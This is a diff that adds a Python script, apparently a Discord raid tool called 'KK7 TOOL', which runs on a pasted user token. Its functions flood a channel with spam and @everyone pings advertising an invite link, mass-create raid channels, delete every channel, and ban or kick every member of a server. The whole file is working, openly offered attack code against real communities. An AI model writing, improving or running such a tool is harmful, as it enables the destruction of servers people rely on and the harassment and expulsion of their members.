@@ -1,0 +1,433 @@
+import requests
+import time
+import sys
+import random
+import threading
+
+# ==================== COLORES ====================
+RESET = "\033[0m"
+BOLD = "\033[1m"
+ROJO = "\033[91m"
+VERDE = "\033[92m"
+AMARILLO = "\033[93m"
+AZUL = "\033[94m"
+CIAN = "\033[96m"
+MAGENTA = "\033[95m"
+BLANCO = "\033[97m"
+
+COLORES = {
+    "1": (ROJO, "Rojo"),
+    "2": (VERDE, "Verde"),
+    "3": (AMARILLO, "Amarillo"),
+    "4": (AZUL, "Azul"),
+    "5": (CIAN, "Cian"),
+    "6": (MAGENTA, "Magenta"),
+    "7": (BLANCO, "Blanco")
+}
+
+COLOR = BLANCO
+
+DISCORD_TOKEN = ""
+CHANNEL_ID = ""
+GUILD_ID = ""
+
+SPAM_MESSAGE = "🔥KK7 TOP🔥\nhttps://discord.gg/WsvNbzsxm8\n@everyone"
+
+# ==================== FUNCIONES BÁSICAS ====================
+def limpiar():
+    print("\033[H\033[J", end="")
+
+def limpiar_input(texto):
+    if not texto: return ""
+    texto = texto.strip()
+    texto = ''.join(c for c in texto if c.isprintable())
+    return texto.replace("^@", "").replace("^(", "").replace(" ", "")
+
+def verificar_token(token):
+    headers = {"Authorization": token}
+    try:
+        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
+        if r.status_code == 200:
+            user = r.json()
+            print(f"{VERDE}✅ Token válido → {user.get('username')}#{user.get('discriminator', '0000')}{RESET}")
+            return True
+        elif r.status_code == 401:
+            print(f"{ROJO}❌ Token inválido o expirado.{RESET}")
+            return False
+        else:
+            print(f"{ROJO}❌ Error ({r.status_code}){RESET}")
+            return False
+    except:
+        print(f"{ROJO}❌ No se pudo verificar el token.{RESET}")
+        return False
+
+def cambiar_color():
+    global COLOR
+    while True:
+        limpiar()
+        print(f"{COLOR}{BOLD}")
+        print("           CAMBIAR COLOR DEL MENÚ")
+        print("═══════════════════════════════════════\n")
+        for num, (color, nombre) in COLORES.items():
+            print(f"   [{num}] {color}{nombre}{RESET}")
+        print(f"\n   [0] Volver sin cambiar\n")
+        op = input(f"{COLOR}{BOLD}   Elige un color → {RESET}").strip()
+        if op == "0":
+            return
+        elif op in COLORES:
+            COLOR = COLORES[op][0]
+            print(f"\n{COLOR}✅ Color cambiado correctamente.{RESET}")
+            time.sleep(1.3)
+            return
+        else:
+            print(f"{ROJO}Opción inválida.{RESET}")
+            time.sleep(1)
+
+def cargar_configuracion():
+    global DISCORD_TOKEN, CHANNEL_ID, GUILD_ID
+    while True:
+        limpiar()
+        print(f"{COLOR}{BOLD}")
+        print("           CONFIGURACIÓN DE DISCORD TOKEN")
+        print("═══════════════════════════════════════════════════════\n")
+        
+        DISCORD_TOKEN = limpiar_input(input(f"{COLOR}Pega tu Discord Token:{RESET} "))
+        
+        print(f"\n{CIAN}Verificando token...{RESET}")
+        if verificar_token(DISCORD_TOKEN):
+            break
+        else:
+            input(f"{ROJO}Presiona ENTER para intentar de nuevo...{RESET}")
+    
+    CHANNEL_ID = limpiar_input(input(f"\n{COLOR}Pega el Channel ID:{RESET} "))
+    GUILD_ID = limpiar_input(input(f"\n{COLOR}Pega el Server (Guild) ID:{RESET} "))
+    
+    if not CHANNEL_ID or not GUILD_ID:
+        print(f"{ROJO}Channel ID y Guild ID son obligatorios.{RESET}")
+        time.sleep(3)
+        sys.exit()
+    
+    print(f"{VERDE}✅ Configuración cargada correctamente.{RESET}")
+    time.sleep(1.5)
+
+def imprimir_banner():
+    print(f"{COLOR}{BOLD}")
+    print(f"{' '*22}KK7 TOOL".center(70))
+    print(f"{' '*21}By Effxz".center(70))
+    print(f"{RESET}")
+
+def enviar_mensaje(contenido, channel_id=None):
+    if not channel_id:
+        channel_id = CHANNEL_ID
+    headers = {"Authorization": DISCORD_TOKEN, "Content-Type": "application/json"}
+    try:
+        r = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages",
+                         json={"content": contenido}, headers=headers, timeout=10)
+        if r.status_code == 429:
+            retry = r.json().get('retry_after', 1)
+            print(f"{AMARILLO}[!] Rate Limit → Esperando {retry}s{RESET}")
+            time.sleep(retry)
+            return False
+        return r.status_code in [200, 204]
+    except:
+        return False
+
+SPAM_MESSAGES = [
+    SPAM_MESSAGE,
+    "||@everyone|| 🔥KK7 TOP🔥 https://discord.gg/WsvNbzsxm8",
+    "🌟 **KK7 ON TOP** 🌟\nhttps://discord.gg/WsvNbzsxm8\n@everyone",
+    "🔥 **RAIDED BY KK7** 🔥 https://discord.gg/WsvNbzsxm8"
+]
+
+# ==================== SPAM FUNCTIONS ====================
+def spam_normal():
+    limpiar()
+    print(f"{ROJO}[!] Normal Spam{RESET}")
+    mensaje = input(f"{COLOR}Mensaje (Enter = default): {RESET}") or SPAM_MESSAGE
+    try: cantidad = int(input(f"{COLOR}Cantidad: {RESET}") or 100)
+    except: cantidad = 100
+    for i in range(cantidad):
+        enviar_mensaje(mensaje)
+        print(f"{VERDE}[✓] {i+1}/{cantidad}{RESET}", end="\r")
+        time.sleep(0.2)
+
+def spam_ultra():
+    limpiar()
+    print(f"{ROJO}[!] ULTRA FAST SPAM{RESET}")
+    mensaje = input(f"{COLOR}Mensaje: {RESET}") or SPAM_MESSAGE
+    try:
+        cantidad = int(input(f"{COLOR}Mensajes por hilo: {RESET}") or 150)
+        hilos = int(input(f"{COLOR}Hilos (1-3): {RESET}") or 2)
+    except:
+        cantidad, hilos = 150, 2
+
+    def thread_spam():
+        for _ in range(cantidad):
+            enviar_mensaje(mensaje)
+            time.sleep(0.05)
+    threads = [threading.Thread(target=thread_spam) for _ in range(hilos)]
+    for t in threads: t.start()
+    for t in threads: t.join()
+    print(f"\n{VERDE}Ultra Spam terminado.{RESET}")
+
+def spam_infinite():
+    limpiar()
+    print(f"{ROJO}[!] Infinite Spam - Presiona CTRL+C para parar{RESET}")
+    i = 0
+    try:
+        while True:
+            enviar_mensaje(random.choice(SPAM_MESSAGES))
+            i += 1
+            print(f"{VERDE}[∞] Mensajes: {i}{RESET}", end="\r")
+            time.sleep(0.15)
+    except KeyboardInterrupt:
+        print(f"\n{AMARILLO}Spam detenido.{RESET}")
+
+def mass_ping():
+    limpiar()
+    print(f"{ROJO}[!] Mass Ping{RESET}")
+    try: cantidad = int(input(f"{COLOR}Cantidad: {RESET}") or 150)
+    except: cantidad = 150
+    for i in range(cantidad):
+        msg = f"||@everyone|| **KK7 RAID** {random.choice(['🔥','💥','⚡'])} https://discord.gg/WsvNbzsxm8"
+        enviar_mensaje(msg)
+        print(f"{VERDE}[✓] {i+1}/{cantidad}{RESET}", end="\r")
+        time.sleep(0.2)
+
+# ==================== NUKE FUNCTIONS MEJORADAS ====================
+def get_all_members():
+    """Obtiene TODOS los miembros del servidor con paginación"""
+    headers = {"Authorization": DISCORD_TOKEN}
+    members = []
+    after = None
+    print(f"{AMARILLO}[!] Obteniendo lista completa de miembros...{RESET}")
+    
+    while True:
+        url = f"https://discord.com/api/v9/guilds/{GUILD_ID}/members?limit=1000"
+        if after:
+            url += f"&after={after}"
+        
+        try:
+            r = requests.get(url, headers=headers, timeout=10)
+            if r.status_code != 200:
+                print(f"{ROJO}Error al obtener miembros: {r.status_code}{RESET}")
+                break
+            
+            data = r.json()
+            if not data:
+                break
+                
+            members.extend(data)
+            after = data[-1]['user']['id'] if data else None
+            
+            print(f"{VERDE}→ Obtenidos {len(members)} miembros...{RESET}", end="\r")
+            
+            if len(data) < 1000:
+                break
+            time.sleep(0.3)  # Evitar rate limit
+        except:
+            break
+    
+    print(f"\n{VERDE}✅ Total miembros encontrados: {len(members)}{RESET}")
+    return members
+
+def create_raid_channels():
+    print(f"{ROJO}[!] Starting ULTRA FAST KK7 Raid...{RESET}")
+    headers = {"Authorization": DISCORD_TOKEN}
+    try:
+        inp = input(f"{COLOR}How many channels? (10-100): {RESET}").strip()
+        cantidad = int(inp) if inp else 50
+        cantidad = max(10, min(100, cantidad))
+    except:
+        cantidad = 50
+
+    name = "🔥KK7-RAID🔥"
+    success = 0
+    for i in range(cantidad):
+        payload = {"name": name, "type": 0}
+        try:
+            r = requests.post(f"https://discord.com/api/v9/guilds/{GUILD_ID}/channels", 
+                            json=payload, headers=headers, timeout=8)
+            if r.status_code in [200, 201]:
+                success += 1
+                ch_id = r.json()['id']
+                print(f"{VERDE}✅ Created → {name}{RESET}")
+                for _ in range(3):
+                    requests.post(f"https://discord.com/api/v9/channels/{ch_id}/messages",
+                                json={"content": SPAM_MESSAGE}, headers=headers)
+        except:
+            pass
+        time.sleep(0.08)
+    print(f"{VERDE}Raid finished! Created {success}/{cantidad} channels.{RESET}")
+
+def delete_all_channels():
+    print(f"{ROJO}[!] Deleting all channels...{RESET}")
+    headers = {"Authorization": DISCORD_TOKEN}
+    try:
+        r = requests.get(f"https://discord.com/api/v9/guilds/{GUILD_ID}/channels", headers=headers)
+        for ch in r.json():
+            if isinstance(ch, dict) and ch.get('type') != 4:
+                requests.delete(f"https://discord.com/api/v9/channels/{ch['id']}", headers=headers)
+                print(f"{ROJO}Deleted → {ch.get('name', 'Unknown')}{RESET}")
+                time.sleep(0.2)
+        print(f"{VERDE}All channels deleted.{RESET}")
+    except Exception as e:
+        print(f"{ROJO}Error: {e}{RESET}")
+
+def ban_all_members():
+    print(f"{ROJO}[!] Starting MASS BAN...{RESET}")
+    members = get_all_members()
+    headers = {"Authorization": DISCORD_TOKEN}
+    banned = 0
+    my_id = None
+    
+    # Obtener tu propio ID
+    try:
+        me = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
+        if me.status_code == 200:
+            my_id = me.json()['id']
+    except:
+        pass
+
+    for member in members:
+        if 'user' not in member:
+            continue
+        user_id = member['user']['id']
+        
+        # No banearte a ti mismo
+        if user_id == my_id:
+            print(f"{AMARILLO}Saltado (tu cuenta){RESET}")
+            continue
+            
+        try:
+            requests.put(f"https://discord.com/api/v9/guilds/{GUILD_ID}/bans/{user_id}", 
+                        headers=headers, json={"delete_message_days": 1})
+            banned += 1
+            print(f"{ROJO}Banned → {member['user'].get('username', 'Unknown')}{RESET}")
+        except:
+            pass
+        time.sleep(0.35)  # Más seguro para evitar rate limit
+    
+    print(f"\n{VERDE}✅ Mass Ban finalizado. Baneados: {banned} miembros.{RESET}")
+
+def kick_all_members():
+    print(f"{ROJO}[!] Starting MASS KICK...{RESET}")
+    members = get_all_members()
+    headers = {"Authorization": DISCORD_TOKEN}
+    kicked = 0
+    my_id = None
+    
+    try:
+        me = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
+        if me.status_code == 200:
+            my_id = me.json()['id']
+    except:
+        pass
+
+    for member in members:
+        if 'user' not in member:
+            continue
+        user_id = member['user']['id']
+        
+        if user_id == my_id:
+            print(f"{AMARILLO}Saltado (tu cuenta){RESET}")
+            continue
+            
+        try:
+            requests.delete(f"https://discord.com/api/v9/guilds/{GUILD_ID}/members/{user_id}", headers=headers)
+            kicked += 1
+            print(f"{ROJO}Kicked → {member['user'].get('username', 'Unknown')}{RESET}")
+        except:
+            pass
+        time.sleep(0.35)
+    
+    print(f"\n{VERDE}✅ Mass Kick finalizado. Expulsados: {kicked} miembros.{RESET}")
+
+# ==================== MENÚS (sin cambios) ====================
+def menu_principal():
+    global COLOR
+    while True:
+        limpiar()
+        imprimir_banner()
+        print(f"{AZUL}   Status  :{RESET} {VERDE}● TOKEN MODE{RESET}")
+        print(f"{AZUL}   Channel  :{RESET} {VERDE}{CHANNEL_ID[:8]}...{RESET}\n")
+        print(f"{COLOR}{BOLD}   MAIN MENU  (Page 1/2){RESET}\n")
+        print(f"{COLOR}   [01]{RESET} Message           → Send custom message")
+        print(f"{COLOR}   [02]{RESET} Normal Spam       → Mejorado")
+        print(f"{COLOR}   [03]{RESET} Ultra Fast Spam   → Multi-thread")
+        print(f"{COLOR}   [04]{RESET} Infinite Spam     → Hasta CTRL+C")
+        print(f"{COLOR}   [05]{RESET} Mass Ping         → @everyone")
+        print(f"{COLOR}   [06]{RESET} Random Spam       → Mensajes variados")
+        print(f"{COLOR}   [N ]{RESET} Next Page         → Nuke Tools\n")
+        print(f"{COLOR}   [99]{RESET} Change Color      → Sistema de colores")
+        print(f"{COLOR}   [Q ]{RESET} Quit\n")
+        
+        choice = input(f"{COLOR}{BOLD}   Choice → {RESET}").strip().upper()
+
+        if choice in ["1", "01"]:
+            limpiar()
+            mensaje = input(f"{COLOR}Enter message:\n{RESET}") or SPAM_MESSAGE
+            try: cantidad = int(input(f"\n{COLOR}How many messages?: {RESET}") or 50)
+            except: cantidad = 50
+            print(f"\n{AMARILLO}Sending...{RESET}\n")
+            for i in range(cantidad):
+                enviar_mensaje(mensaje)
+                print(f"{VERDE}[✓] [{i+1:2d}/{cantidad}] Sent{RESET}")
+                time.sleep(0.2)
+
+        elif choice in ["2", "02"]: spam_normal()
+        elif choice in ["3", "03"]: spam_ultra()
+        elif choice in ["4", "04"]: spam_infinite()
+        elif choice in ["5", "05"]: mass_ping()
+        elif choice in ["6", "06"]:
+            print(f"{ROJO}[!] Random Spam{RESET}")
+            try: cantidad = int(input(f"{COLOR}Cantidad: {RESET}") or 120)
+            except: cantidad = 120
+            for i in range(cantidad):
+                enviar_mensaje(random.choice(SPAM_MESSAGES))
+                print(f"{VERDE}[✓] {i+1}/{cantidad}{RESET}", end="\r")
+                time.sleep(0.2)
+
+        elif choice == "N":
+            nuke_menu()
+        elif choice in ["99"]:
+            cambiar_color()
+        elif choice in ["Q", "00", "0"]:
+            print(f"\n{AMARILLO}Thanks for using KK7 TOOL! Goodbye! 👋{RESET}")
+            break
+        else:
+            print(f"{ROJO}Invalid option.{RESET}")
+
+        if choice not in ["Q", "00", "0", "N"]:
+            input(f"\n{AMARILLO}Press ENTER to return...{RESET}")
+
+def nuke_menu():
+    while True:
+        limpiar()
+        print(f"{COLOR}{BOLD}                 SERVER NUKE MENU  (Page 2/2){RESET}\n")
+        print(f"{ROJO}[07]{RESET} Nuke Server       → Create raid channels + spam")
+        print(f"{ROJO}[08]{RESET} Delete Channels   → Delete all channels")
+        print(f"{ROJO}[09]{RESET} Ban All           → Ban ALL members (mejorado)")
+        print(f"{ROJO}[10]{RESET} Kick All          → Kick ALL members (mejorado)")
+        print(f"{COLOR}[99]{RESET} Back to Main Menu\n")
+        
+        op = input(f"{COLOR}{BOLD}Choice → {RESET}").strip().upper()
+
+        if op == "7": create_raid_channels()
+        elif op == "8": delete_all_channels()
+        elif op == "9": ban_all_members()
+        elif op == "10": kick_all_members()
+        elif op in ["99", "Q"]: return
+        else: print(f"{ROJO}Invalid option.{RESET}")
+        
+        input(f"\n{AMARILLO}Press ENTER to continue...{RESET}")
+
+# ==================== INICIO ====================
+if __name__ == "__main__":
+    try:
+        cargar_configuracion()
+        menu_principal()
+    except KeyboardInterrupt:
+        print(f"\n{ROJO}Program stopped.{RESET}")
+    except Exception as e:
+        print(f"{ROJO}Error: {e}{RESET}")
